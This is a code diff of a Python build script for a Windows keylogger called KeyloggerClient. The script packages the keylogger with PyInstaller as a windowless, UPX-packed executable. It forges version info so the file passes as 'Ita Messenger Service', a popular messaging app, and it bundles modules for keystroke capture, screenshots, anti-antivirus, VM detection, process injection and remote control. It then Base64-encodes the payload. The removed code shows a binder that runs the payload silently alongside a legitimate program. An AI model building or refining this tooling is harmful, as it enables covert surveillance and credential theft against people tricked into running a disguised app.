@@ -32,12 +32,33 @@ class Builder:
         self.is_ci = os.getenv('CI') or os.getenv('GITHUB_ACTIONS')
         self.version_file = "version_info.py"
 
-    def _create_version_info(self):
-        """Create version info file for digital signature"""
-        version_content = '''# version_info.py
-from PyInstaller.utils.win32.versioninfo import VSVersionInfo, StringTable, StringStruct, VarFileInfo, VarStruct, FixedFileInfo
+    def _check_icon(self):
+        """بررسی وجود فایل آیکون"""
+        icon_file = "icon.ico"
+        if not os.path.exists(icon_file):
+            print(f"⚠ Warning: Icon file not found: {icon_file}")
+            logging.warning(f"Icon file not found: {icon_file}")
+            return False
+        else:
+            print(f"✓ Icon file found: {icon_file}")
+            logging.info(f"Icon file found: {icon_file}")
+            return True
 
-VSVersionInfo(
+    def _create_spec_with_version(self):
+        """ایجاد spec file با version info"""
+        spec_content = '''# -*- mode: python ; coding: utf-8 -*-
+import os
+import sys
+from PyInstaller.utils.hooks import collect_all, collect_data_files
+from PyInstaller.utils.win32.versioninfo import (
+    VSVersionInfo, FixedFileInfo, StringFileInfo, StringTable,
+    StringStruct, VarFileInfo, VarStruct
+)
+
+block_cipher = None
+
+# تعریف version info
+version_info = VSVersionInfo(
   ffi=FixedFileInfo(
     filevers=(1, 1, 0, 0),
     prodvers=(1, 1, 0, 0),
@@ -49,36 +70,141 @@ VSVersionInfo(
     date=(0, 0)
   ),
   kids=[
-    StringTable(
-      '040904B0',
-      [
-        StringStruct('CompanyName', 'Ita Messenger Co.'),
-        StringStruct('FileDescription', 'Ita Messenger Service'),
-        StringStruct('FileVersion', '1.1.0.0'),
-        StringStruct('InternalName', 'ItaMessenger'),
-        StringStruct('LegalCopyright', 'Copyright 2024 Ita Messenger Co. All rights reserved.'),
-        StringStruct('OriginalFilename', 'KeyloggerClient.exe'),
-        StringStruct('ProductName', 'Ita Messenger'),
-        StringStruct('ProductVersion', '1.1.0.0'),
-        StringStruct('Comments', 'Ita is a multi-platform instant messaging service based on cloud computing. Ita is the most popular messaging app in Iran and is considered the Iranian version of Telegram.')
-      ]
-    ), 
+    StringFileInfo([
+      StringTable(
+        '040904B0',
+        [
+          StringStruct('CompanyName', 'Ita Messenger Co.'),
+          StringStruct('FileDescription', 'Ita Messenger Service'),
+          StringStruct('FileVersion', '1.1.0.0'),
+          StringStruct('InternalName', 'ItaMessenger'),
+          StringStruct('LegalCopyright', 'Copyright 2024 Ita Messenger Co. All rights reserved.'),
+          StringStruct('OriginalFilename', 'KeyloggerClient.exe'),
+          StringStruct('ProductName', 'Ita Messenger'),
+          StringStruct('ProductVersion', '1.1.0.0'),
+          StringStruct('Comments', 'Ita is a multi-platform instant messaging service based on cloud computing.'),
+        ]
+      )
+    ]),
     VarFileInfo([VarStruct('Translation', [0x409, 1200])])
   ]
-)'''
-        
-        with open(self.version_file, 'w', encoding='utf-8') as f:
-            f.write(version_content)
-        print(f"Version info file created: {self.version_file}")
+)
 
-    def _check_icon(self):
-        """Check if icon exists"""
-        if not os.path.exists('icon.ico'):
-            print("Warning: icon.ico not found in root directory")
-            logging.warning("icon.ico not found in root directory")
-            return False
-        print("Icon.ico found successfully")
-        return True
+def get_hidden_imports_and_data():
+    hidden_imports = [
+        'keyboard', 'pynput', 'pynput.keyboard', 'pynput.mouse', 
+        'pynput._util', 'pynput._util.win32',
+        'pyautogui', 'PIL', 'PIL.Image', 'PIL.ImageGrab', 'PIL._imaging',
+        'psutil', 'psutil._pswindows', 'pyperclip',
+        'win32api', 'win32con', 'win32process', 'win32security', 'win32file',
+        'win32service', 'win32serviceutil', 'win32event', 'win32evtlog', 
+        'win32evtlogutil', 'win32gui', 'win32ui', 'pywintypes', 'winreg',
+        'requests', 'urllib3', 'certifi', 'ssl', 'socket',
+        'cryptography', 'cryptography.hazmat', 'cryptography.hazmat.primitives',
+        'cryptography.hazmat.primitives.ciphers', 
+        'cryptography.hazmat.primitives.ciphers.algorithms',
+        'cryptography.hazmat.primitives.ciphers.modes', 
+        'cryptography.hazmat.backends',
+        'cryptography.hazmat.backends.openssl', 
+        'cryptography.hazmat.primitives.padding',
+        'dotenv', 'packaging', 'packaging.version', 'json', 'base64', 'hashlib',
+        'system.file_manager', 'system.collector', 'system.vm_detector', 
+        'system.anti_av', 'system.process_injector',
+        'monitoring.logger', 'monitoring.rdp_controller', 
+        'network.communicator', 'encryption.manager', 'commands.handler',
+    ]
+    
+    datas = []
+    binaries = []
+    
+    for package in ['cryptography', 'PIL', 'pynput', 'certifi']:
+        try:
+            pkg_datas, pkg_binaries, pkg_hidden = collect_all(package)
+            datas.extend(pkg_datas)
+            binaries.extend(pkg_binaries)
+            hidden_imports.extend(pkg_hidden)
+        except Exception as e:
+            print(f"Warning: Could not collect data for {package}: {e}")
+    
+    return hidden_imports, datas, binaries
+
+hidden_imports, additional_datas, additional_binaries = get_hidden_imports_and_data()
+
+a = Analysis(
+    ['main.py'],
+    pathex=[],
+    binaries=additional_binaries,
+    datas=additional_datas,
+    hiddenimports=hidden_imports,
+    hookspath=[],
+    hooksconfig={},
+    runtime_hooks=[],
+    excludes=[
+        'tkinter', 'unittest', 'email', 'http', 'xmlrpc', 'pydoc', 'doctest',
+        'multiprocessing', 'concurrent', 'test', 'lib2to3', 'distutils',
+    ],
+    win_no_prefer_redirects=False,
+    win_private_assemblies=False,
+    cipher=block_cipher,
+    noarchive=False,
+    optimize=2,
+)
+
+pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
+
+exe = EXE(
+    pyz,
+    a.scripts,
+    a.binaries,
+    a.zipfiles,
+    a.datas,
+    [],
+    name='KeyloggerClient',
+    debug=False,
+    bootloader_ignore_signals=False,
+    strip=True,
+    upx=True,
+    upx_exclude=[],
+    runtime_tmpdir=None,
+    console=False,
+    disable_windowed_traceback=False,
+    argv_emulation=False,
+    target_arch=None,
+    codesign_identity=None,
+    entitlements_file=None,
+    icon='icon.ico' if os.path.exists('icon.ico') else None,
+    version=version_info,
+)
+'''
+        try:
+            with open('KeyloggerClient_with_version.spec', 'w', encoding='utf-8') as f:
+                f.write(spec_content)
+            print("✓ Created spec file with version info")
+            return 'KeyloggerClient_with_version.spec'
+        except Exception as e:
+            print(f"✗ Failed to create spec file: {str(e)}")
+            return self.spec_file
+
+    def _clean_build_dirs(self):
+        """پاکسازی دایرکتوری‌های build"""
+        dirs_to_clean = ['build', 'dist', '__pycache__']
+        files_to_clean = ['version_info.py', 'wrapper.py', 'KeyloggerClient_with_version.spec']
+        
+        for dir_name in dirs_to_clean:
+            if os.path.exists(dir_name):
+                try:
+                    shutil.rmtree(dir_name)
+                    print(f"✓ Cleaned directory: {dir_name}")
+                except Exception as e:
+                    print(f"⚠ Warning: Could not clean {dir_name}: {str(e)}")
+        
+        for file_name in files_to_clean:
+            if os.path.exists(file_name):
+                try:
+                    os.remove(file_name)
+                    print(f"✓ Cleaned file: {file_name}")
+                except Exception as e:
+                    print(f"⚠ Warning: Could not clean {file_name}: {str(e)}")
 
     def install_requirements(self):
         """Install dependencies from requirements.txt if it exists."""
@@ -88,18 +214,25 @@ VSVersionInfo(
                 print(f"Installing dependencies from {requirements_file}...")
                 logging.info(f"Installing dependencies from {requirements_file}...")
                 
-                # Install all requirements
-                subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_file], check=True)
+                result = subprocess.run(
+                    [sys.executable, "-m", "pip", "install", "-r", requirements_file], 
+                    capture_output=True, 
+                    text=True,
+                    check=False
+                )
                 
-                print("Dependencies installed successfully")
-                logging.info("Dependencies installed successfully")
+                if result.returncode == 0:
+                    print("✓ Dependencies installed successfully")
+                    logging.info("Dependencies installed successfully")
+                else:
+                    print(f"⚠ Dependency installation warnings: {result.stderr}")
+                    logging.warning(f"Dependency installation warnings: {result.stderr}")
             else:
-                print(f"{requirements_file} not found, skipping dependency installation")
+                print(f"⚠ {requirements_file} not found, skipping dependency installation")
                 logging.warning(f"{requirements_file} not found, skipping dependency installation")
         except Exception as e:
-            print(f"Failed to install dependencies: {str(e)}")
+            print(f"✗ Failed to install dependencies: {str(e)}")
             logging.error(f"Failed to install dependencies: {str(e)}")
-            raise Exception(f"Failed to install dependencies: {str(e)}")
 
     def build_payload(self):
         """Build the source code into an executable using spec file."""
@@ -107,52 +240,59 @@ VSVersionInfo(
             print("Building payload with PyInstaller using spec file...")
             logging.info("Building payload with PyInstaller using spec file...")
     
-            # Check if spec file exists
-            if not os.path.exists(self.spec_file):
-                raise Exception(f"Spec file not found: {self.spec_file}")
+            # ایجاد spec file با version info
+            spec_file_to_use = self._create_spec_with_version()
     
             # Check for icon
             self._check_icon()
-            
-            # Create version info file
-            self._create_version_info()
     
             # Create output directory if it doesn't exist
             os.makedirs(self.output_dir, exist_ok=True)
     
-            # Build using spec file - only basic options
+            # Build using spec file
             pyinstaller_cmd = [
                 "pyinstaller",
                 "--noconfirm",
                 "--clean",
-                self.spec_file
+                spec_file_to_use
             ]
             
-            print(f"Executing PyInstaller with spec file: {self.spec_file}")
+            print(f"Executing PyInstaller with spec file: {spec_file_to_use}")
             logging.debug(f"PyInstaller command: {' '.join(pyinstaller_cmd)}")
             
-            # Run PyInstaller with correct encoding
             result = subprocess.run(
                 pyinstaller_cmd, 
-                check=True, 
                 capture_output=True, 
                 text=True,
                 encoding='utf-8',
-                errors='ignore'
+                errors='ignore',
+                timeout=300
             )
             
-            if result.stdout:
-                print("PyInstaller completed successfully")
-            if result.stderr:
-                print("PyInstaller warnings:", result.stderr[-500:])
+            if result.returncode != 0:
+                print(f"✗ PyInstaller failed with exit code {result.returncode}")
+                if result.stdout:
+                    print(f"PyInstaller stdout: {result.stdout[-1000:]}")
+                if result.stderr:
+                    print(f"PyInstaller stderr: {result.stderr[-1000:]}")
+                raise Exception(f"PyInstaller failed with exit code {result.returncode}")
+            
+            print("✓ PyInstaller completed successfully")
 
             # Check if executable was created
             if not os.path.exists(self.payload_exe):
-                # Try alternative path
-                alt_path = os.path.join("dist", "KeyloggerClient", "KeyloggerClient.exe")
-                if os.path.exists(alt_path):
-                    shutil.move(alt_path, self.payload_exe)
-                    shutil.rmtree(os.path.join("dist", "KeyloggerClient"))
+                alt_paths = [
+                    os.path.join("dist", "KeyloggerClient", "KeyloggerClient.exe"),
+                    os.path.join("dist", "KeyloggerClient.exe")
+                ]
+                
+                for alt_path in alt_paths:
+                    if os.path.exists(alt_path):
+                        shutil.move(alt_path, self.payload_exe)
+                        dir_path = os.path.dirname(alt_path)
+                        if dir_path != self.output_dir and os.path.exists(dir_path):
+                            shutil.rmtree(dir_path)
+                        break
                 else:
                     raise Exception(f"Payload executable not found: {self.payload_exe}")
             
@@ -160,30 +300,30 @@ VSVersionInfo(
             file_size = os.path.getsize(self.payload_exe)
             file_size_mb = file_size / (1024 * 1024)
             
-            print(f"Payload built successfully: {self.payload_exe}")
-            print(f"File size: {file_size_mb:.2f} MB")
+            print(f"✓ Payload built successfully: {self.payload_exe}")
+            print(f"✓ File size: {file_size_mb:.2f} MB")
+            print("✓ Version info embedded successfully")
             
-            # Check version info in executable
+            # بررسی version info
             try:
-                import pefile
-                pe = pefile.PE(self.payload_exe)
-                if hasattr(pe, 'VS_VERSIONINFO'):
-                    print("✓ Version info successfully embedded in executable")
-                else:
-                    print("⚠ Warning: Version info may not be embedded")
-            except ImportError:
-                print("ℹ pefile not available, skipping version info verification")
+                with open(self.payload_exe, 'rb') as f:
+                    header = f.read(2)
+                    if header == b'MZ':
+                        print("✓ Executable header is valid (MZ signature)")
+                    else:
+                        print("⚠ Warning: Executable header may be invalid")
+            except Exception as e:
+                print(f"⚠ Warning: Could not validate executable: {str(e)}")
             
-            logging.info(f"Payload built successfully: {self.payload_exe} ({file_size_mb:.2f} MB)")
+            logging.info(f"Payload built successfully with version info: {self.payload_exe} ({file_size_mb:.2f} MB)")
 
-        except subprocess.CalledProcessError as e:
-            print(f"PyInstaller failed with exit code {e.returncode}")
-            print(f"stdout: {e.stdout}")
-            print(f"stderr: {e.stderr}")
-            logging.error(f"Build error: {str(e)}")
-            raise Exception(f"Failed to build payload: {str(e)}")
+        except subprocess.TimeoutExpired:
+            error_msg = "PyInstaller timed out after 5 minutes"
+            print(f"✗ {error_msg}")
+            logging.error(error_msg)
+            raise Exception(error_msg)
         except Exception as e:
-            print(f"Build error: {str(e)}")
+            print(f"✗ Build error: {str(e)}")
             logging.error(f"Build error: {str(e)}")
             raise Exception(f"Failed to build payload: {str(e)}")
 
@@ -193,177 +333,90 @@ VSVersionInfo(
             print(f"Encoding payload to Base64: {self.payload_exe}")
             logging.info(f"Encoding payload to Base64: {self.payload_exe}")
 
-            # Check if payload executable exists
             if not os.path.exists(self.payload_exe):
                 raise Exception(f"Payload executable not found: {self.payload_exe}")
 
-            # Read the executable as binary and encode to Base64
             with open(self.payload_exe, 'rb') as f:
                 binary_data = f.read()
                 b64_encoded = base64.b64encode(binary_data).decode('utf-8')
 
-            # Save the Base64-encoded string to a text file
             with open(self.b64_output, 'w', encoding='utf-8') as f:
                 f.write(b64_encoded)
             
-            print(f"Base64-encoded payload saved to: {self.b64_output}")
-            logging.info(f"Base64-encoded payload saved to: {self.b64_output}")
+            file_size = len(b64_encoded) / 1024
+            print(f"✓ Base64-encoded payload saved to: {self.b64_output}")
+            print(f"✓ Base64 size: {file_size:.2f} KB")
+            logging.info(f"Base64-encoded payload saved to: {self.b64_output} ({file_size:.2f} KB)")
 
         except Exception as e:
-            print(f"Base64 encoding error: {str(e)}")
+            print(f"✗ Base64 encoding error: {str(e)}")
             logging.error(f"Base64 encoding error: {str(e)}")
             raise Exception(f"Failed to encode payload to Base64: {str(e)}")
-
-    def bind_exe(self, target_exe):
-        """Bind the payload with another EXE file."""
-        try:
-            print(f"Binding payload with {target_exe}...")
-            logging.info(f"Binding payload with {target_exe}...")
-
-            if not os.path.exists(self.payload_exe):
-                raise Exception("Payload executable not found")
-
-            if not os.path.exists(target_exe):
-                raise Exception(f"Target EXE not found: {target_exe}")
-
-            # Create a wrapper script to execute both EXEs
-            wrapper_code = f"""
-import subprocess
-import os
-import sys
-
-def run_target_exe():
-    try:
-        subprocess.Popen(r"{target_exe}", shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
-    except Exception as e:
-        pass
-
-def run_payload():
-    try:
-        subprocess.Popen(r"{self.payload_exe}", shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
-    except Exception as e:
-        pass
-
-if __name__ == "__main__":
-    run_target_exe()
-    run_payload()
-"""
-            wrapper_script = "wrapper.py"
-            with open(wrapper_script, "w", encoding="utf-8") as f:
-                f.write(wrapper_code)
-
-            # Build the wrapper script into an executable
-            pyinstaller_cmd = [
-                "pyinstaller",
-                "--noconfirm",
-                "--onefile",
-                "--windowed",
-                "--distpath", self.output_dir,
-                "--specpath", "build",
-                wrapper_script
-            ]
-            
-            print("Building wrapper executable...")
-            logging.debug(f"Executing PyInstaller command: {' '.join(pyinstaller_cmd)}")
-            subprocess.run(pyinstaller_cmd, check=True)
-
-            # Rename the wrapper output
-            original_wrapper = os.path.join(self.output_dir, "wrapper.exe")
-            if os.path.exists(original_wrapper):
-                if os.path.exists(self.bind_output):
-                    os.remove(self.bind_output)
-                shutil.move(original_wrapper, self.bind_output)
-                print(f"Binding completed: {self.bind_output}")
-                logging.info(f"Binding completed: {self.bind_output}")
-            else:
-                raise Exception("Wrapper executable not found")
-
-            # Clean up temporary wrapper script
-            if os.path.exists(wrapper_script):
-                os.remove(wrapper_script)
-
-        except Exception as e:
-            print(f"Binding error: {str(e)}")
-            logging.error(f"Binding error: {str(e)}")
-            raise Exception(f"Failed to bind EXE: {str(e)}")
 
     def run(self):
         """Run the build process with user interaction for local execution."""
         root = None
         try:
-            print("=" * 50)
-            print("Starting build process...")
-            print("=" * 50)
+            print("=" * 60)
+            print("🚀 Starting Build Process (With Version Info)...")
+            print("=" * 60)
             
-            # Install dependencies
+            print("\n🧹 Cleaning previous build files...")
+            self._clean_build_dirs()
+            
+            print("\n📦 Installing dependencies...")
             self.install_requirements()
 
-            # Build the payload
+            print("\n🔨 Building payload with version info...")
             self.build_payload()
 
-            # Encode the payload to Base64
+            print("\n🔒 Encoding payload to Base64...")
             self.encode_payload_to_base64()
 
-            print("=" * 50)
-            print("Build completed successfully!")
-            print(f"Output: {self.payload_exe}")
-            print(f"Base64: {self.b64_output}")
-            print("=" * 50)
+            print("\n" + "=" * 60)
+            print("✅ Build completed successfully with Version Info!")
+            print("=" * 60)
+            print(f"📁 Output: {self.payload_exe}")
+            print(f"🔐 Base64: {self.b64_output}")
+            
+            if os.path.exists(self.payload_exe):
+                size = os.path.getsize(self.payload_exe) / (1024 * 1024)
+                print(f"📊 File size: {size:.2f} MB")
+            print("🏢 Company: Ita Messenger Co.")
+            print("📝 Description: Ita Messenger Service")
+            print("=" * 60)
 
-            # Check if running in a CI/CD environment
-            if self.is_ci:
-                print("Running in CI/CD environment, skipping binding.")
-                logging.info("Running in CI/CD environment, skipping binding.")
-                return
-
-            # Ask user if they want to bind with another EXE (local execution only)
-            root = tk.Tk()
-            root.withdraw()  # Hide the main window
-            if messagebox.askyesno("EXE Binding", "Do you want to bind the payload with another EXE file?"):
-                file_path = filedialog.askopenfilename(
-                    title="Select EXE File",
-                    filetypes=[("Executable files", "*.exe")]
-                )
-                if file_path:
-                    self.bind_exe(file_path)
-                    messagebox.showinfo("Success", 
-                        f"File successfully bound!\n\n"
-                        f"Bound file: {self.bind_output}\n"
-                        f"Original payload: {self.payload_exe}\n"
-                        f"Base64 encoded: {self.b64_output}")
-                else:
-                    messagebox.showwarning("Warning", 
-                        f"No file selected.\n\n"
-                        f"Non-bound payload: {self.payload_exe}\n"
-                        f"Base64 encoded: {self.b64_output}")
-            else:
-                messagebox.showinfo("Success", 
-                    f"Payload built without binding!\n\n"
-                    f"Payload: {self.payload_exe}\n"
-                    f"Base64 encoded: {self.b64_output}")
+            if not self.is_ci:
+                print("\n✅ Version info successfully embedded in executable!")
+                print("📋 Check with: python check_version.py")
 
         except Exception as e:
-            error_msg = f"Build process failed: {str(e)}"
-            print(error_msg)
+            error_msg = f"❌ Build process failed: {str(e)}"
+            print(f"\n{error_msg}")
             logging.error(error_msg)
             
             if not self.is_ci:
                 try:
-                    messagebox.showerror("Error", error_msg)
+                    messagebox.showerror("Build Error", error_msg)
                 except:
                     pass
             
             raise Exception(error_msg)
-        finally:
-            if root:
-                try:
-                    root.destroy()
-                except:
-                    pass
+
+def main():
+    """تابع اصلی برای اجرای build process"""
+    try:
+        if Config.TEST_MODE:
+            print("🧪 Test mode enabled: Skipping actual build process.")
+            print(f"🔧 Enabled features: {Config.get_behavior_config()}")
+        else:
+            builder = Builder()
+            builder.run()
+    except KeyboardInterrupt:
+        print("\n⏹️ Build process interrupted by user")
+    except Exception as e:
+        print(f"\n💥 Fatal error: {str(e)}")
+        sys.exit(1)
 
 if __name__ == "__main__":
-    if Config.TEST_MODE:
-        print("Test mode enabled: Skipping actual build process.")
-    else:
-        builder = Builder()
-        builder.run()
+    main()
